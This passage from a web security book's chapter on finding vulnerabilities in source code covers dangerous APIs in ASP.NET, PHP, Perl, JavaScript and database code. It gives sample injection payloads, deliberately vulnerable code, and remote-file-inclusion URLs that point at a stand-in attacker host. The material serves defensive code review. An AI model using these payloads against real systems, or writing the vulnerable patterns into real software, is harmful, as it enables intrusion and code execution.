be possible to execute arbitrary commands or modify the application‚Äôs logic.
The functions Execute and ExecuteGlobal take a string containing ASP code, 
which they execute just as if the code appeared directly within the script itself. 
The colon delimiter can be used to batch multiple statements. If user-controllable 
data is passed into the Execute function, the application is probably vulnerable 
to arbitrary command execution.
OS Command Execution
The following APIs can be used in various ways to launch an external process 
from within an ASP.NET application:
n System.Diagnostics.Start.Process
n System.Diagnostics.Start.ProcessStartInfo
A fi lename string can be passed to the static Process.Start method, or the 
StartInfo property of a Process object can be confi gured with a fi lename before 
calling Start on the object. If the user can fully control the fi lename string, the 
application is almost certainly vulnerable to arbitrary command execution. For 
example, the following causes the Windows calc program to run:
string userinput = ‚Äúcalc‚Äù;
Process.Start(userinput);
If the user controls only part of the string passed to Start, the application 
may still be vulnerable. For example:
string userinput = ‚Äú..\\..\\..\\Windows\\System32\\calc‚Äù;
Process.Start(‚ÄúC:\\Program Files\\MyApp\\bin\\‚Äù + userinput);
The API does not interpret shell metacharacters such as & and |, nor does 
it accept command-line arguments within the fi lename parameter. Therefore, 
this kind of attack is the only one likely to succeed when the user controls only 
a part of the fi lename parameter.
Command-line arguments to the launched process can be set using the 
Arguments property of the ProcessStartInfo class. If only the Arguments parameter is user-controllable, the application may still be vulnerable to something 
other than code execution. For example, if an application executes the program 
wget with a user-controllable parameter as the target URL, an attacker may 
be able to pass dangerous command-line parameters to the wget process. For 
c19.indd 722 c19.indd 722 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 723
 Chapter 19 n Finding Vulnerabilities in Source Code 723
example, the process might download a document and save it to an arbitrary 
location on the fi lesystem.
URL Redirection
The following APIs can be used to issue an HTTP redirect in ASP.NET:
n System.Web.HttpResponse.Redirect
n System.Web.HttpResponse.Status
n System.Web.HttpResponse.StatusCode
n System.Web.HttpResponse.AddHeader
n System.Web.HttpResponse.AppendHeader
n Server.Transfer
The usual means of causing a redirect response is via the HttpResponse.
Redirect method, which takes a string containing a relative or absolute URL. 
If the value of this string is user-controllable, the application is probably vulnerable to a phishing vector.
You should also be sure to review any uses of the Status/StatusCode properties and the AddHeader/AppendHeader methods. Given that a redirect simply 
involves a 3xx response containing an HTTP Location header, an application 
may implement redirects using these APIs.
The Server.Transfer method is also sometimes used to perform redirection. However, this does not in fact cause an HTTP redirect. Instead, it simply 
changes the page being processed on the server in response to the current 
request. Accordingly, it cannot be subverted to cause redirection to an off-site 
URL, so it is usually less useful to an attacker.
Sockets
The System.Net.Sockets.Socket class is used to create network sockets. After a 
Socket object has been created, it is connected via a call to the Connect method, 
which takes the IP and port details of the target host as its parameters. If this 
host information can be controlled by the user in any way, the application may be 
exploitable to cause network connections to arbitrary hosts, either on the Internet 
or on the private DMZ or internal network on which the application is hosted.
Confi guring the ASP.NET Environment
The Web.config XML fi le in the web root directory contains confi guration 
settings for the ASP.NET environment, listed in Table 19-6, and controls how 
applications behave.
c19.indd 723 c19.indd 723 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 724
724 Chapter 19 n Finding Vulnerabilities in Source Code 
Table 19-6: Security-Relevant Confi guration Settings for the ASP.NET Environment
SETTING DESCRIPTION
httpCookies Determines the security settings associated with cookies. If 
the httpOnlyCookies attribute is set to true, cookies are 
fl agged as HttpOnly and therefore are not directly accessible 
from client-side scripts. If the requireSSL attribute is set to 
true, cookies are fl agged as secure and therefore are transmitted by browsers only within HTTPS requests.
sessionState Determines how sessions behave. The value of the timeout
attribute determines the time in minutes after which an idle 
session will be expired. If the regenerateExpiredSessionId element is set to true (which is the default), a new session ID is issued when an expired session ID is received.
compilation Determines whether debugging symbols are compiled into 
pages, resulting in more verbose debug error information. 
If the debug attribute is set to true, debug symbols are 
included.
customErrors Determines whether the application returns detailed error 
messages in the event of an unhandled error. If the mode attribute is set to On or RemoteOnly, the page identifi ed by the 
defaultRedirect attribute is displayed to application users 
in place of detailed system-generated messages.
httpRuntime Determines various runtime settings. If the enableHeaderChecking attribute is set to true (which is the default), ASP.
NET checks request headers for potential injection attacks, 
including cross-site scripting. If the enableVersionHeader
attribute is set to true (which is the default), ASP.NET outputs a detailed version string, which may be of use to an 
attacker in researching vulnerabilities in specifi c versions of 
the platform.
If sensitive data such as database connection strings is stored in the confi guration 
fi le, it should be encrypted using the ASP.NET ‚Äúprotected confi guration‚Äù feature.
PHP
This section describes ways to acquire user-supplied input, ways to interact with 
the user‚Äôs session, potentially dangerous APIs, and security-relevant confi guration options on the PHP platform.
Identifying User-Supplied Data
PHP uses a range of array variables to store user-submitted data, as listed in 
Table 19-7.
c19.indd 724 c19.indd 724 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 725
 Chapter 19 n Finding Vulnerabilities in Source Code 725
Table 19-7: Variables Used to Acquire User-Supplied Data on the PHP Platform
VARIABLE DESCRIPTION
$_GET
$HTTP_GET_VARS
Contains the parameters submitted in 
the query string. These are accessed 
by name. For example, in the following 
URL:
https://wahh-app.com/search
.php?query=foo
the value of the query parameter is 
accessed using:
$_GET[‚Äòquery‚Äô]
$_POST
$HTTP_POST_VARS
Contains the parameters submitted in 
the request body.
$_COOKIE
$HTTP_COOKIE_VARS
Contains the cookies submitted in the 
request.
$_REQUEST Contains all the items in the $_GET, $_
POST, and $_COOKIE arrays.
$_FILES
$HTTP_POST_FILES
Contains the fi les uploaded in the 
request.
$_SERVER[‚ÄòREQUEST_METHOD‚Äô] Contains the method used in the HTTP 
request.
$_SERVER[‚ÄòQUERY_STRING‚Äô] Contains the full query string submitted 
in the request.
$_SERVER[‚ÄòREQUEST_URI‚Äô] Contains the full URL contained in the 
request.
$_SERVER[‚ÄòHTTP_ACCEPT‚Äô] Contains the contents of the HTTP 
Accept header.
$_SERVER[‚ÄòHTTP_ACCEPT_CHARSET‚Äô] Contains the contents of the HTTP 
Accept-charset header.
$_SERVER[‚ÄòHTTP_ACCEPT_
ENCODING‚Äô]
Contains the contents of the HTTP 
Accept-encoding header.
$_SERVER[‚ÄòHTTP_ACCEPT_
LANGUAGE‚Äô]
Contains the contents of the HTTP 
Accept-language header.
$_SERVER[‚ÄòHTTP_CONNECTION‚Äô] Contains the contents of the HTTP 
Connection header.
$_SERVER[‚ÄòHTTP_HOST‚Äô] Contains the contents of the HTTP Host
header.
Continued
c19.indd 725 c19.indd 725 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 726
726 Chapter 19 n Finding Vulnerabilities in Source Code 
VARIABLE DESCRIPTION
$_SERVER[‚ÄòHTTP_REFERER‚Äô] Contains the contents of the HTTP 
Referer header.
$_SERVER[‚ÄòHTTP_USER_AGENT‚Äô] Contains the contents of the HTTP 
User-agent header.
$_SERVER[‚ÄòPHP_SELF‚Äô] Contains the name of the currently executing script. Although the script name 
itself is outside an attacker‚Äôs control, 
path information can be appended to 
this name. For example, if a script contains the following code:
<form action=‚Äù<?= $_
SERVER[‚ÄòPHP_SELF‚Äô] ?>‚Äù>
an attacker can craft a cross-site scripting attack as follows:
/search.php/‚Äù><script>
and so on.
You should keep in mind various anomalies when attempting to identify 
ways in which a PHP application is accessing user-supplied input:
n $GLOBALS is an array containing references to all variables that are defi ned in 
the script‚Äôs global scope. It may be used to access other variables by name.
n If the confi guration directive register_globals is enabled, PHP creates 
global variables for all request parameters ‚Äî that is, everything contained 
in the $_REQUEST array. This means that an application may access user 
input simply by referencing a variable that has the same name as the 
relevant parameter. If an application uses this method of accessing usersupplied data, there may be no way to identify all instances of this other 
than via a careful line-by-line review of the codebase to fi nd variables 
used in this way.
n In addition to the standard HTTP headers identifi ed previously, PHP adds 
an entry to the $_SERVER array for any custom HTTP headers received in 
the request. For example, supplying the header:
Foo: Bar
causes:
$_SERVER[‚ÄòHTTP_FOO‚Äô] = ‚ÄúBar‚Äù
Table 19-7 (continued)
c19.indd 726 c19.indd 726 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 727
 Chapter 19 n Finding Vulnerabilities in Source Code 727
n Input parameters whose names contain subscripts in square brackets are 
automatically converted into arrays. For example, requesting this URL:
https://wahh-app.com/search.php?query[a]=foo&query[b]=bar
causes the value of the $_GET[‚Äòquery‚Äô] variable to be an array containing two members. This may result in unexpected behavior within the 
application if an array is passed to a function that expects a scalar value.
Session Interaction
PHP uses the $_SESSION array as a way to store and retrieve information within 
the user‚Äôs session. For example:
$_SESSION[‚ÄòMyName‚Äô] = $_GET[‚Äòusername‚Äô]; // store user‚Äôs name
echo ‚ÄúWelcome ‚Äú . $_SESSION[‚ÄòMyName‚Äô]; // retrieve user‚Äôs name
The $HTTP_SESSION_VARS array may be used in the same way.
If register_globals is enabled (as discussed in the later section ‚ÄúConfi guring 
the PHP Environment‚Äù), global variables may be stored within the current session as follows:
$MyName = $_GET[‚Äòusername‚Äô];
session_register(‚ÄúMyName‚Äù);
Potentially Dangerous APIs
This section describes some common PHP APIs that can introduce security 
vulnerabilities if used in an unsafe manner.
File Access
PHP implements a large number of functions for accessing fi les, many of which 
accept URLs and other constructs that may be used to access remote fi les.
The following functions are used to read or write the contents of a specifi ed 
fi le. If user-controllable data is passed to these APIs, an attacker may be able to 
exploit these to access arbitrary fi les on the server fi lesystem.
n fopen
n readfile
n file
n fpassthru
n gzopen
c19.indd 727 c19.indd 727 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 728
728 Chapter 19 n Finding Vulnerabilities in Source Code 
n gzfile
n gzpassthru
n readgzfile
n copy
n rename
n rmdir
n mkdir
n unlink
n file_get_contents
n file_put_contents
n parse_ini_file
The following functions are used to include and evaluate a specifi ed PHP 
script. If an attacker can cause the application to evaluate a fi le he controls, he 
can achieve arbitrary command execution on the server.
n include
n include_once
n require
n require_once
n virtual
Note that even if it is not possible to include remote fi les, command execution may still be possible if there is a way to upload arbitrary fi les to a location 
on the server.
The PHP confi guration option allow_url_fopen can be used to prevent some 
fi le functions from accessing remote fi les. However, by default this option is 
set to 1 (meaning that remote fi les are allowed), so the protocols listed in Table 
19-8 can be used to retrieve a remote fi le.
Table 19-8: Network Protocols That Can Be Used to Retrieve a Remote File
PROTOCOL EXAMPLE
HTTP, HTTPS http://wahh-attacker.com/bad.php
FTP ftp://user:password@wahh-attacker.com/bad.php
SSH ssh2.shell://user:pass@wahh-attacker.com:22/
xterm
ssh2.exec://user:pass@wahh-attacker.com:22/cmd
c19.indd 728 c19.indd 728 8/19/2011 12:18:36 PM 8/19/2011 12:18:36 PM
Stuttard c19.indd V2 - 08/11/2011 Page 729
 Chapter 19 n Finding Vulnerabilities in Source Code 729
Even if allow_url_fopen is set to 0, the methods listed in Table 19-9 may still 
enable an attacker to access remote fi les (depending on the extensions installed).
Table 19-9: Methods That May Allow Access to Remote Files Even If allow_url_fopen
Is Set to 0
METHOD EXAMPLE
SMB \\wahh-attacker.com\bad.php
PHP input/output 
streams
php://filter/resource=http://wahh-attacker.
com/bad.php
Compression streams compress.zlib://http://wahh-attacker.com/
bad.php
Audio streams ogg://http://wahh-attacker.com/bad.php
NOTE PHP 5.2 and later releases have a new option, allow_url_include,
which is disabled by default. This default confi guration prevents any of the 
preceding methods from being used to specify a remote fi le when calling one 
of the fi le include functions.
Database Access
The following functions are used to send a query to a database and retrieve 
the results:
n mysql_query
n mssql_query
n pg_query
The SQL statement is passed as a simple string. If user-controllable input 
is part of the string parameter, the application is probably vulnerable to SQL 
injection. For example:
$username = ‚Äúadmin‚Äô or 1=1--‚Äù;
$password = ‚Äúfoo‚Äù;
$sql=‚ÄùSELECT * FROM users WHERE username = ‚Äò$username‚Äô 
 AND password = ‚Äò$password‚Äô‚Äù;
$result = mysql_query($sql, $link)
executes this unintended query:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
c19.indd 729 c19.indd 729 8/19/2011 12:18:37 PM 8/19/2011 12:18:37 PM
Stuttard c19.indd V2 - 08/11/2011 Page 730
730 Chapter 19 n Finding Vulnerabilities in Source Code 
The following functions can be used to create prepared statements. This 
allows an application to create a SQL query containing parameter placeholders 
and set their values in a secure and type-safe way:
n mysqli->prepare
n stmt->prepare
n stmt->bind_param
n stmt->execute
n odbc_prepare
If used as intended, this mechanism is not vulnerable to SQL injection. For 
example:
$username = ‚Äúadmin‚Äô or 1=1--‚Äù;
$password = ‚Äúfoo‚Äù;
$sql = $db_connection->prepare(
 ‚ÄúSELECT * FROM users WHERE username = ? AND password = ?‚Äù);
$sql->bind_param(‚Äúss‚Äù, $username, $password);
$sql->execute();
results in a query that is equivalent to the following:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
Dynamic Code Execution
The following functions can be used to dynamically evaluate PHP code:
n eval
n call_user_func
n call_user_func_array
n call_user_method
n call_user_method_array
n create_function
The semicolon delimiter can be used to batch multiple statements. If usercontrollable data is passed into any of these functions, the application is probably 
vulnerable to script injection.
The function preg_replace, which performs a regular expression search and 
replace, can be used to run a specifi c piece of PHP code against every match if 
called with the /e option. If user-controllable data appears in the PHP that is 
dynamically executed, the application is probably vulnerable.
c19.indd 730 c19.indd 730 8/19/2011 12:18:37 PM 8/19/2011 12:18:37 PM
Stuttard c19.indd V2 - 08/11/2011 Page 731
 Chapter 19 n Finding Vulnerabilities in Source Code 731
Another interesting feature of PHP is the ability to invoke functions dynamically via a variable containing the function‚Äôs name. For example, the following 
code invokes the function specifi ed in the func parameter of the query string:
<?php
 $var=$_GET[‚Äòfunc‚Äô];
 $var();
?>
In this situation, a user can cause the application to invoke an arbitrary function (without parameters) by modifying the value of the func parameter. For 
example, invoking the phpinfo function causes the application to output a large 
amount of information about the PHP environment, including confi guration 
options, OS information, and extensions.
OS Command Execution
These functions can be used to execute operating system commands:
n exec
n passthru
n popen
n proc_open
n shell_exec
n system
n The backtick operator (`)
In all these cases, commands can be chained together using the | character. 
If user-controllable data is passed unfi ltered into any of these functions, the 
application is probably vulnerable to arbitrary command execution.
URL Redirection
The following APIs can be used to issue an HTTP redirect in PHP:
n http_redirect
n header
n HttpMessage::setResponseCode
n HttpMessage::setHeaders
The usual way to cause a redirect is through the http_redirect function, 
which takes a string containing a relative or absolute URL. If the value of 
c19.indd 731 c19.indd 731 8/19/2011 12:18:37 PM 8/19/2011 12:18:37 PM
Stuttard c19.indd V2 - 08/11/2011 Page 732
732 Chapter 19 n Finding Vulnerabilities in Source Code 
this string is user-controllable, the application is probably vulnerable to a 
phishing vector.
Redirects can also be performed by calling the header function with an appropriate Location header, which causes PHP to deduce that an HTTP redirect is 
required. For example:
header(‚ÄúLocation: /target.php‚Äù);
You should also review any uses of the setResponseCode and setHeaders
APIs. Given that a redirect simply involves a 3xx response containing an HTTP 
Location header, an application may implement redirects using these APIs.
Sockets
The following APIs can be used to create and use network sockets in PHP:
n socket_create
n socket_connect
n socket_write
n socket_send
n socket_recv
n fsockopen
n pfsockopen
After a socket is created using socket_create, it is connected to a remote 
host via a call to socket_connect, which takes the target‚Äôs host and port details 
as its parameters. If this host information is user-controllable in any way, the 
application may be exploitable to cause network connections to arbitrary hosts, 
either on the public Internet or on the private DMZ or internal network on which 
the application is hosted.
The fsockopen and pfsockopen functions can be used to open sockets to a 
specifi ed host and port and return a fi le pointer that can be used with regular 
fi le functions such as fwrite and fgets. If user data is passed to these functions, 
the application may be vulnerable, as described previously.
Confi guring the PHP Environment
PHP confi guration options are specifi ed in the php.ini fi le, which uses the 
same structure as Windows INI fi les. Various options can affect an application‚Äôs security. Many options that have historically caused problems have been 
removed from the latest version of PHP.
c19.indd 732 c19.indd 732 8/19/2011 12:18:37 PM 8/19/2011 12:18:37 PM
Stuttard c19.indd V2 - 08/11/2011 Page 733
 Chapter 19 n Finding Vulnerabilities in Source Code 733
Register Globals
If the register_globals directive is enabled, PHP creates global variables for 
all request parameters. Given that PHP does not require variables to be initialized before use, this option can easily lead to security vulnerabilities in which 
an attacker can cause a variable to be initialized to an arbitrary value.
For example, the following code checks a user‚Äôs credentials and sets the 
$authenticated variable to 1 if they are valid:
if (check_credentials($username, $password))
{
 $authenticated = 1;
}
...
if ($authenticated)
{
 ...
Because the $authenticated variable is not fi rst explicitly initialized to 0, an 
attacker can bypass the login by submitting the request parameter authenticated=1. This causes PHP to create the global variable $authenticated with a 
value of 1 before the credentials check is performed.
NOTE From PHP 4.2.0 onward, the register_globals directive is disabled 
by default. However, because many legacy applications depend on register_globals for their normal operation, you may often fi nd that this directive has been explicitly enabled in php.ini. The register_globals option 
was removed in PHP 6.
Safe Mode
If the safe_mode directive is enabled, PHP places restrictions on the use of some 
dangerous functions. Some functions are disabled, and others are subject to 
limitations on their use. For example:
n The shell_exec function is disabled because it can be used to execute 
operating system commands.
n The mail function has the parameter additional_parameters disabled 
because unsafe use of this parameter may lead to SMTP injection fl aws 
(see Chapter 10).
n The exec function can be used only to launch executables within the 
confi gured safe_mode_exec_dir. Metacharacters within the command 
string are automatically escaped.
c19.indd 733 c19.indd 733 8/19/2011 12:18:37 PM 8/19/2011 12:18:37 PM
Stuttard c19.indd V2 - 08/11/2011 Page 734
734 Chapter 19 n Finding Vulnerabilities in Source Code 
NOTE Not all dangerous functions are restricted by safe mode, and some 
restrictions are affected by other confi guration options. Furthermore, there 
are various ways to bypass some safe mode restrictions. Safe mode should 
not be considered a panacea to security issues within PHP applications. Safe 
mode has been removed from PHP version 6.
Magic Quotes
If the magic_quotes_gpc directive is enabled, any single quote, double quote, 
backslash, and NULL characters contained within request parameters are automatically escaped using a backslash. If the magic_quotes_sybase directive is 
enabled, single quotes are instead escaped using a single quote. This option is 
designed to protect vulnerable code containing unsafe database calls from being 
exploitable via malicious user input. When reviewing the application codebase to 
identify any SQL injection fl aws, you should be aware of whether magic quotes 
are enabled, because this affects the application‚Äôs handling of input.
Using magic quotes does not prevent all SQL injection attacks. As described 
in Chapter 9, an attack that injects into a numeric fi eld does not need to use 
single quotation marks. Furthermore, data whose quotes have been escaped 
may still be used in a second-order attack when it is subsequently read back 
from the database.
The magic quotes option may result in undesirable modifi cation of user input, 
when data is being processed in a context that does not require any escaping. 
This can result in the addition of slashes that need to be removed using the 
stripslashes function.
Some applications perform their own escaping of relevant input by passing 
individual parameters through the addslashes function only when required. 
If magic quotes are enabled in the PHP confi guration, this approach results in 
double-escaped characters. Doubled-up slashes are interpreted as literal backslashes, leaving the potentially malicious character unescaped.
Because of the limitations and anomalies of the magic quotes option, it is 
recommended that prepared statements be used for safe database access and 
that the magic quotes option be disabled.
NOTE The magic quotes option has been removed from PHP version 6.
Miscellaneous
Table 19-10 lists some miscellaneous confi guration options that can affect the 
security of PHP applications.
c19.indd 734 c19.indd 734 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 735
 Chapter 19 n Finding Vulnerabilities in Source Code 735
Table 19-10: Miscellaneous PHP Confi guration Options
OPTION DESCRIPTION
allow_url_fopen If disabled, this directive prevents some fi le functions 
from accessing remote fi les (as described previously).
allow_url_include If disabled, this directive prevents the PHP fi le include 
functions from being used to include a remote fi le.
display_errors If disabled, this directive prevents PHP errors from being 
reported to the user‚Äôs browser. The log_errors and 
error_log options can be used to record error information on the server for diagnostic purposes.
file_uploads If enabled, this directive causes PHP to allow fi le uploads 
over HTTP.
upload_tmp_dir This directive can be used to specify the temporary 
directory used to store uploaded fi les. This can be used 
to ensure that sensitive fi les are not stored in a worldreadable location.
Perl
This section describes ways to acquire user-supplied input, ways to interact with 
the user‚Äôs session, potentially dangerous APIs, and security-relevant confi guration options on the Perl platform.
The Perl language is notorious for allowing developers to perform the same 
task in a multitude of ways. Furthermore, numerous Perl modules can be used to 
meet different requirements. Any unusual or proprietary modules in use should 
be closely reviewed to identify whether they use any powerful or dangerous 
functions and thus may introduce the same vulnerabilities as if the application 
made direct use of those functions.
CGI.pm is a widely used Perl module for creating web applications. It provides 
the APIs you are most likely to encounter when performing a code review of a 
web application written in Perl.
Identifying User-Supplied Data
The functions listed in Table 19-11 are all members of the CGI query object.
c19.indd 735 c19.indd 735 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 736
736 Chapter 19 n Finding Vulnerabilities in Source Code 
Table 19-11: CGI Query Members Used to Acquire User-Supplied Data
FUNCTION DESCRIPTION
param
param_fetch
Called without parameters, param returns a list of all the 
parameter names in the request.
Called with the name of a parameter, param returns the 
value of that request parameter.
The param_fetch method returns an array of the named 
parameters.
Vars Returns a hash mapping of parameter names to values.
cookie
raw_cookie
The value of a named cookie can be set and retrieved 
using the cookie function.
The raw_cookie function returns the entire contents of 
the HTTP Cookie header, without any parsing having been 
performed.
self_url
url
Return the current URL, in the fi rst case including any 
query string.
query_string Returns the query string of the current request.
referer Returns the value of the HTTP Referer header.
request_method Returns the value of the HTTP method used in the request.
user_agent Returns the value of the HTTP User-agent header.
http
https
Return a list of all the HTTP environment variables derived 
from the current request.
ReadParse Creates an array named %in that contains the names and 
values of all the request parameters.
Session Interaction
The Perl module CGISession.pm extends the CGI.pm module and provides support for session tracking and data storage. For example:
$q->session_data(‚ÄúMyName‚Äù=>param(‚Äúusername‚Äù)); // store user‚Äôs name
print ‚ÄúWelcome ‚Äú . $q->session_data(‚ÄúMyName‚Äù); // retrieve user‚Äôs name
Potentially Dangerous APIs
This section describes some common Perl APIs that can introduce security 
vulnerabilities if used in an unsafe manner.
c19.indd 736 c19.indd 736 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 737
 Chapter 19 n Finding Vulnerabilities in Source Code 737
File Access
The following APIs can be used to access fi les in Perl:
n open
n sysopen
The open function reads and writes the contents of a specifi ed fi le. If usercontrollable data is passed as the fi lename parameter, an attacker may be able 
to access arbitrary fi les on the server fi lesystem.
Furthermore, if the fi lename parameter begins or ends with the pipe character, 
the contents of this parameter are passed to a command shell. If an attacker 
can inject data containing shell metacharacters such as the pipe or semicolon, 
he may be able to perform arbitrary command execution. For example, in the 
following code, an attacker can inject into the $useraddr parameter to execute 
system commands:
$useraddr = $query->param(‚Äúuseraddr‚Äù);
open (MAIL, ‚Äú| /usr/bin/sendmail $useraddr‚Äù);
print MAIL ‚ÄúTo: $useraddr\n‚Äù;
...
Database Access
The selectall_arrayref function sends a query to a database and retrieves 
the results as an array of arrays. The do function executes a query and simply 
returns the number of rows affected. In both cases, the SQL statement is passed 
as a simple string.
If user-controllable input comprises part of the string parameter, the application is probably vulnerable to SQL injection. For example:
my $username = ‚Äúadmin‚Äô or 1=1--‚Äù;
my $password = ‚Äúfoo‚Äù;
my $sql=‚ÄùSELECT * FROM users WHERE username = ‚Äò$username‚Äô AND password =
 ‚Äò$password‚Äô‚Äù;
my $result = $db_connection->selectall_arrayref($sql)
executes this unintended query:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
The functions prepare and execute can be used to create prepared statements, allowing an application to create a SQL query containing parameter 
c19.indd 737 c19.indd 737 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 738
738 Chapter 19 n Finding Vulnerabilities in Source Code 
placeholders and set their values in a secure and type-safe way. If used as 
intended, this mechanism is not vulnerable to SQL injection. For example:
my $username = ‚Äúadmin‚Äô or 1=1--‚Äù;
my $password = ‚Äúfoo‚Äù;
my $sql = $db_connection->prepare(‚ÄúSELECT * FROM users 
 WHERE username = ? AND password = ?‚Äù);
$sql->execute($username, $password);
results in a query that is equivalent to the following:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
Dynamic Code Execution
eval can be used to dynamically execute a string containing Perl code. The 
semicolon delimiter can be used to batch multiple statements. If user-controllable 
data is passed into this function, the application is probably vulnerable to script 
injection.
OS Command Execution
The following functions can be used to execute operating system commands:
n system
n exec
n qx
n The backtick operator (`)
In all these cases, commands can be chained together using the | character. 
If user-controllable data is passed unfi ltered into any of these functions, the 
application is probably vulnerable to arbitrary command execution.
URL Redirection
The redirect function, which is a member of the CGI query object, takes a 
string containing a relative or absolute URL, to which the user is redirected. If 
the value of this string is user-controllable, the application is probably vulnerable to a phishing vector.
c19.indd 738 c19.indd 738 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 739
 Chapter 19 n Finding Vulnerabilities in Source Code 739
Sockets
After a socket is created using socket, it is connected to a remote host via a call 
to connect, which takes a sockaddr_in structure composed of the target‚Äôs host 
and port details. If this host information is user-controllable in any way, the 
application may be exploitable to cause network connections to arbitrary hosts, 
either on the Internet or on the private DMZ or internal network on which the 
application is hosted.
Confi guring the Perl Environment
Perl provides a taint mode that helps prevent user-supplied input from being 
passed to potentially dangerous functions. You can execute Perl programs in 
taint mode by passing the -T fl ag to the Perl interpreter as follows:
#!/usr/bin/perl -T
When a program is running in taint mode, the interpreter tracks each item 
of input received from outside the program and treats it as tainted. If another 
variable has its value assigned on the basis of a tainted item, it too is treated as 
tainted. For example:
$path = ‚Äú/home/pubs‚Äù # $path is not tainted
$filename = param(‚Äúfile‚Äù); # $filename is from request parameter and
 # is tainted
$full_path = $path.$filename; # $full_path now tainted
Tainted variables cannot be passed to a range of powerful commands, including eval, system, exec, and open. To use tainted data in sensitive operations, 
the data must be ‚Äúcleaned‚Äù by performing a pattern-matching operation and 
extracting the matched substrings. For example:
$full_path =~ m/^([a-zA-Z1-9]+)$/; # match alphanumeric submatch 
 # in $full_path
$clean_full_path = $1; # set $clean_full_path to the 
 # first submatch
 # $clean_full_path is untainted
Although the taint mode mechanism is designed to help protect against many 
kinds of vulnerabilities, it is effective only if developers use appropriate regular 
expressions when extracting clean data from tainted input. If an expression is 
too liberal and extracts data that may cause problems in the context in which it 
c19.indd 739 c19.indd 739 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 740
740 Chapter 19 n Finding Vulnerabilities in Source Code 
will be used, the taint mode protection fails, and the application is still vulnerable. In effect, the taint mode mechanism reminds programmers to perform 
suitable validation on all input before using it in dangerous operations. It cannot 
guarantee that the input validation implemented will be adequate.
JavaScript
Client-side JavaScript can, of course, be accessed without requiring any privileged access to the application, enabling you to perform a security-focused 
code review in any situation. A key focus of this review is to identify any 
vulnerabilities such as DOM-based XSS, which are introduced on the client 
component and leave users vulnerable to attack (see Chapter 12). A further 
reason for reviewing JavaScript is to understand what kinds of input validation are implemented on the client, and also how dynamically generated user 
interfaces are constructed.
When reviewing JavaScript, you should be sure to include both .js fi les and 
scripts embedded in HTML content.
The key APIs to focus on are those that read from DOM-based data and that 
write to or otherwise modify the current document, as shown in Table 19-12.
Table 19-12: JavaScript APIs That Read from DOM-Based Data
API DESCRIPTION
document.location
document.URL
document.URLUnencoded
document.referrer
window.location
Can be used to access DOM data that may be 
controllable via a crafted URL, and may therefore represent an entry point for crafted data to 
attack other application users.
document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()
Can be used to update the document‚Äôs contents and to dynamically execute JavaScript 
code. If attacker-controllable data is passed to 
any of these APIs, this may provide a way to 
execute arbitrary JavaScript within a victim‚Äôs 
browser.
c19.indd 740 c19.indd 740 8/19/2011 12:18:38 PM 8/19/2011 12:18:38 PM
Stuttard c19.indd V2 - 08/11/2011 Page 741
 Chapter 19 n Finding Vulnerabilities in Source Code 741
Database Code Components
Web applications increasingly use databases for much more than passive data 
storage. Today‚Äôs databases contain rich programming interfaces, enabling substantial business logic to be implemented within the database tier itself. Developers 
frequently use database code components such as stored procedures, triggers, 
and user-defi ned functions to carry out key tasks. Therefore, when you review 
the source code to a web application, you should ensure that all logic implemented in the database is included in the scope of the review.
Programming errors in database code components can potentially result in 
any of the various security defects described in this chapter. In practice, however, you should watch for two main areas of vulnerabilities. First, database 
components may themselves contain SQL injection fl aws. Second, user input 
may be passed to potentially dangerous functions in unsafe ways.
SQL Injection
Chapter 9 described how prepared statements can be used as a safe alternative 
to dynamic SQL statements to prevent SQL injection attacks. However, even if 
prepared statements are properly used throughout the web application‚Äôs own 
code, SQL injection fl aws may still exist if database code components construct 
queries from user input in an unsafe manner.
The following is an example of a stored procedure that is vulnerable to SQL 
injection in the @name parameter:
CREATE PROCEDURE show_current_orders
 (@name varchar(400) = NULL)
AS
DECLARE @sql nvarchar(4000)
SELECT @sql = ‚ÄòSELECT id_num, searchstring FROM searchorders WHERE ‚Äò +
 ‚Äòsearchstring = ‚Äò‚Äô‚Äô + @name + ‚Äò‚Äô‚Äô‚Äô;
EXEC (@sql)
GO
Even if the application passes the user-supplied name value to the stored 
procedure in a safe manner, the procedure itself concatenates this directly into 
a dynamic query and therefore is vulnerable.
Different database platforms use different methods to perform dynamic 
execution of strings containing SQL statements. For example:
n MS-SQL ‚Äî EXEC
n Oracle ‚Äî EXECUTE IMMEDIATE
c19.indd 741 c19.indd 741 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c19.indd V2 - 08/11/2011 Page 742
742 Chapter 19 n Finding Vulnerabilities in Source Code 
n Sybase ‚Äî EXEC
n DB2 ‚Äî EXEC SQL
Any appearance of these expressions within database code components should 
be closely reviewed. If user input is being used to construct the SQL string, the 
application may be vulnerable to SQL injection.
NOTE On Oracle, stored procedures by default run with the permissions of 
the defi ner, rather than the invoker (as with SUID programs on UNIX). Hence, 
